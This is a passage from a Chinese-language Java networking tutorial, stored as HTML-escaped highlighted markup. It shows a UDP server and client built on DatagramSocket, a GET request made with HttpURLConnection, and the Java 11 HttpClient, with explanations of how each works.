&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">receive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 收取一个UDP数据包
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 收取到的数据存储在buffer中，由packet.getOffset(), packet.getLength()指定起始位置和长度
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 将其按UTF-8编码转换为String:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getData&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOffset&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLength&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 发送数据:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ACK&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setData&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接收UDP数据包之前先要准备缓冲区，并通过&lt;code>DatagramPacket&lt;/code>实现接收&lt;/p>
&lt;p>假设我们收取到的是一个&lt;code>String&lt;/code>，那么，通过&lt;code>DatagramPacket&lt;/code>返回的&lt;code>packet.getOffset()&lt;/code>和&lt;code>packet.getLength()&lt;/code>确定数据在缓冲区的起止位置&lt;/p>
&lt;p>当服务器收到一个DatagramPacket后，通常必须立刻回复一个或多个UDP包，因为客户端地址在DatagramPacket中，每次收到的DatagramPacket可能是不同的客户端，如果不回复，客户端就收不到任何UDP包&lt;/p>
&lt;p>Client&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramSocket&lt;/span> &lt;span style="color:#111">ds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramSocket&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSoTimeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InetAddress&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getByName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#ae81ff">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 连接指定服务器和端口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 发送:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramPacket&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 接收:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">receive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getData&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOffset&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLength&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">disconnect&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里的&lt;code>connect&lt;/code>不是真连接，它是为了在客户端的&lt;code>DatagramSocket&lt;/code>实例中保存服务器端的IP和端口号，确保这个&lt;code>DatagramSocket&lt;/code>实例只能往指定的地址和端口发送UDP包，不能往其他地址和端口发送。这么做不是UDP的限制，而是Java内置了安全检查。&lt;/p>
&lt;p>如果客户端希望向两个不同的服务器发送UDP包，那么它必须创建两个&lt;code>DatagramSocket&lt;/code>实例。&lt;/p>
&lt;p>后续的收发数据和服务器端是一致的。通常来说，客户端必须先发UDP包，因为客户端不发UDP包，服务器端就根本不知道客户端的地址和端口号。&lt;/p>
&lt;p>&lt;code>disconnect()&lt;/code>也不是真正地断开连接，它只是清除了客户端&lt;code>DatagramSocket&lt;/code>实例记录的远程服务器地址和端口号，这样，&lt;code>DatagramSocket&lt;/code>实例就可以连接另一个服务器端。&lt;/p>
&lt;h3 id="httpclient">HttpClient&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.example.com/path/to/target?a=1&amp;amp;b=2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpURLConnection&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpURLConnection&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">openConnection&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setUseCaches&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setConnectTimeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 请求超时5秒
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 设置HTTP头:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Mozilla/5.0 (compatible; MSIE 11; Windows NT 5.1)&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 连接并发送HTTP请求:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 判断HTTP响应是否200:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getResponseCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bad response&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取所有响应Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHeaderFields&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">keySet&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取响应内容:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>从Java 11开始，引入了新的&lt;code>HttpClient&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.URI&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.http.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.http.HttpClient.Version&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.time.Duration&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 全局HttpClient:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span> &lt;span style="color:#111">httpClient&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://www.sina.com.cn/&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpRequest&lt;/span> &lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Java HttpClient&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置超时:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Duration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofSeconds&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置版本:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">version&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Version&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">HTTP_2&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">httpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BodyHandlers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// HTTP允许重复的Header，因此一个Header可对应多个Value:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">header&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">keySet&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">header&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">header&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
